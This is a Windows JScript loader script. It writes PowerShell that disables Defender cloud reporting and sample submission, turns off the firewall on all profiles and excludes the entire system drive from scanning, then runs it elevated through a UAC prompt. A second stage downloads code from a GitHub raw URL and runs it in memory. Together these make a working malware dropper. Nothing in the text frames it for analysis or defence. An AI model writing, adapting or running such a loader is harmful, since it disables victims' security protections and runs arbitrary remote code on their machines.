// run_remote_in_memory.js
// WScript/CScript script for Windows that elevates, fetches a remote script into memory, and executes it as admin

var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

var tempFolder = shell.ExpandEnvironmentStrings("%TEMP%");
var timestamp = (new Date()).getTime();
var bootstrapPath1 = tempFolder + "\\bootstrap_memory1" + timestamp + ".ps1";
var bootstrapPath = tempFolder + "\\bootstrap_memory_" + timestamp + ".ps1";

var psLines1 = [];
psLines1.push('Set-MpPreference -MAPSReporting 0');
psLines1.push('Set-MpPreference -SubmitSamplesConsent 2');
psLines1.push('Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False');
psLines1.push('Add-MpPreference -ExclusionPath $env:SystemDrive -ErrorAction Stop');




// Join lines with CRLF
var psContent1 = psLines1.join("\r\n");

try {
    var bootstrapFile1 = fso.CreateTextFile(bootstrapPath1, true);

    bootstrapFile1.Write(psContent1);
    bootstrapFile1.Close();
} catch (e) {
    shell.Popup("Failed to create bootstrap file: " + e.message, 0, "Error", 16);
    WScript.Quit(1);
}

// <-- URL to fetch -->
var remoteUrl = "https://github.com/tripoli-university-ly/download/raw/refs/heads/main/code.txt";

// Build PowerShell bootstrap that fetches and runs code in memory
var psLines = [];
psLines.push('$ErrorActionPreference = "Stop"');
psLines.push('$ProgressPreference = "SilentlyContinue"');
psLines.push('');
psLines.push('$url = "' + remoteUrl.replace(/"/g, '\\"') + '"');
psLines.push('');
psLines.push('try {');
psLines.push('    Write-Host "Fetching script content from $url"');
psLines.push('    $wc = New-Object System.Net.WebClient');
psLines.push('    $wc.Headers.Add("User-Agent", "Mozilla/5.0")');
psLines.push('    $content = $wc.DownloadString($url)');
psLines.push('');
psLines.push('    if (-not $content -or $content.Trim().Length -eq 0) {');
psLines.push('        Write-Host "Script content is empty." -ForegroundColor Red');
psLines.push('        exit 1');
psLines.push('    }');
psLines.push('');
psLines.push('    Write-Host "Executing script in memory..."');
psLines.push('    Invoke-Command -ScriptBlock ([ScriptBlock]::Create($content))');
psLines.push('} catch {');
psLines.push('    Write-Host "Error fetching or running script: $($_.Exception.Message)" -ForegroundColor Red');
psLines.push('    exit 1');
psLines.push('}');


// Join lines with CRLF
var psContent = psLines.join("\r\n");

// Write bootstrap to temp file (needed for elevation, will be deleted automatically later)
try {
    var bootstrapFile = fso.CreateTextFile(bootstrapPath, true);
    bootstrapFile.Write(psContent);
    bootstrapFile.Close();
} catch (e) {
    shell.Popup("Failed to create bootstrap file: " + e.message, 0, "Error", 16);
    WScript.Quit(1);
}


// Build elevation command
var argList1 = '-NoProfile -ExecutionPolicy Bypass -File "' + bootstrapPath1 + '"';
var elevateCommand1 = 'Start-Process -FilePath "powershell"  -ArgumentList \'' + argList1.replace(/'/g, "'\"'\"'") + '\' -Verb RunAs';


// Build elevation command
var argList = '-NoProfile -ExecutionPolicy Bypass -File "' + bootstrapPath + '"';
var elevateCommand = 'Start-Process -FilePath "powershell"  -ArgumentList \'' + argList.replace(/'/g, "'\"'\"'") + '\'';


try {
    var finalCmd1 = 'powershell -NoProfile -Command "' + elevateCommand1.replace(/"/g, '\\"') + '"';
    shell.Run(finalCmd1, 1, false); // 1 = normal window so UAC appears
    
    var finalCmd = 'powershell -NoProfile -Command "' + elevateCommand.replace(/"/g, '\\"') + '"';
    shell.Run(finalCmd, 1, false); // 1 = normal window so UAC appears
} catch (e) {
    shell.Popup("Failed to launch elevation: " + e.message, 0, "Error", 16);
    WScript.Quit(1);
}


WScript.Quit(0);
